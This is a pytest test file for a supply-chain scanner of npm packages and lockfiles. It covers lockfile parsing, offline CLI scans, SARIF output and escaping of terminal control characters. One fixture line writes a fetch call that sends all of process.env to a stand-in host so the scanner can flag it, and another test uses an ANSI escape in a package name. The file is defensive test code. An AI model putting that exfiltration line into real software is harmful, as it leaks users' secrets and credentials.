from __future__ import annotations

import json
from pathlib import Path

import pytest

from supply_chain_sentinel.cli import main
from supply_chain_sentinel.config import Config
from supply_chain_sentinel.lockfile import changed_dependencies, parse_lockfile
from supply_chain_sentinel.models import Finding, ScanError, ScanReport
from supply_chain_sentinel.output import render, sarif
from supply_chain_sentinel.scanner import Scanner, exit_code


def lockfile(tmp_path: Path, info: dict[str, object] | None = None) -> Path:
    path = tmp_path / "package-lock.json"
    path.write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {},
                    "node_modules/demo": info or {"version": "1.0.0", "integrity": "sha512-test"},
                },
            },
            indent=2,
        )
    )
    return path


def test_lockfile_versions_aliases_and_diff(tmp_path: Path) -> None:
    path = lockfile(tmp_path)
    deps = parse_lockfile(path)
    assert deps[0].spec == "demo@1.0.0" and deps[0].line > 1
    assert not changed_dependencies(deps, deps)
    alias = lockfile(tmp_path, {"name": "@scope/real", "version": "2.0.0", "integrity": "sha512-x"})
    assert parse_lockfile(alias)[0].spec == "@scope/real@2.0.0"


@pytest.mark.parametrize(
    "info",
    [
        {"version": "file:../x"},
        {"link": True},
        {"version": "1.0.0"},
        {"version": "1.0.0", "integrity": "x", "resolved": "http://localhost/x"},
    ],
)
def test_unsupported_lock_entries_fail(tmp_path: Path, info: dict[str, object]) -> None:
    with pytest.raises(ScanError):
        parse_lockfile(lockfile(tmp_path, info))


def test_end_to_end_cli_local_offline(
    package: Path, config: Config, capsys: pytest.CaptureFixture[str]
) -> None:
    args = [
        "--cache-dir",
        str(config.cache_dir),
        "scan",
        str(package),
        "--offline",
        "--format",
        "json",
    ]
    assert main(args) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["counts"]["clean"] == 1
    assert result["results"][0]["coverage"]["advisories"] == "not-queried"
    (package / "index.js").write_text(
        "fetch('https://x.invalid',{body:JSON.stringify(process.env)})"
    )
    assert main(args) == 1
    assert json.loads(capsys.readouterr().out)["counts"]["review"] == 1
    assert main(args + ["--require-advisories"]) == 2
    assert json.loads(capsys.readouterr().out)["counts"]["error"] == 1


def test_dynamic_never_falls_back(package: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert main(["scan", str(package), "--dynamic"]) == 2
    assert "unavailable" in capsys.readouterr().err


def test_lockfile_errors_fail_ci(
    tmp_path: Path, config: Config, capsys: pytest.CaptureFixture[str]
) -> None:
    path = lockfile(tmp_path)
    assert (
        main(
            [
                "--cache-dir",
                str(config.cache_dir),
                "scan-lockfile",
                str(path),
                "--offline",
                "--format",
                "json",
                "--fail-on",
                "never",
            ]
        )
        == 2
    )
    assert json.loads(capsys.readouterr().out)["counts"]["error"] == 1


def test_sarif_locations_suppressions_and_errors() -> None:
    report = ScanReport("demo", "1.0.0", findings=[Finding("env-network", "high", 0.9, "test")])
    report.findings[0].suppressed = True
    report.findings[0].suppression_reason = "reviewed"
    data = sarif([report], {"demo@1.0.0": ("package-lock.json", 5)})
    result = data["runs"][0]["results"][0]
    assert result["locations"][0]["physicalLocation"]["region"]["startLine"] == 5
    assert result["suppressions"][0]["justification"] == "reviewed"
    failed = ScanReport("x", status="error", verdict="error", errors=["offline miss"])
    assert not sarif([failed])["runs"][0]["invocations"][0]["executionSuccessful"]
    assert exit_code([failed], "never") == 2


def test_terminal_control_escaping() -> None:
    report = ScanReport("evil\x1b[2J", "1.0.0")
    assert "\x1b" not in render([report], "text")
    assert "\\x1b" in render([report], "text")


def test_no_finding_is_not_claimed_safe(package: Path, config: Config) -> None:
    report = Scanner(config).scan(str(package), offline=True)
    assert report.status == "complete" and report.verdict == "clean"
    assert "safety guarantee" in render([report], "text")
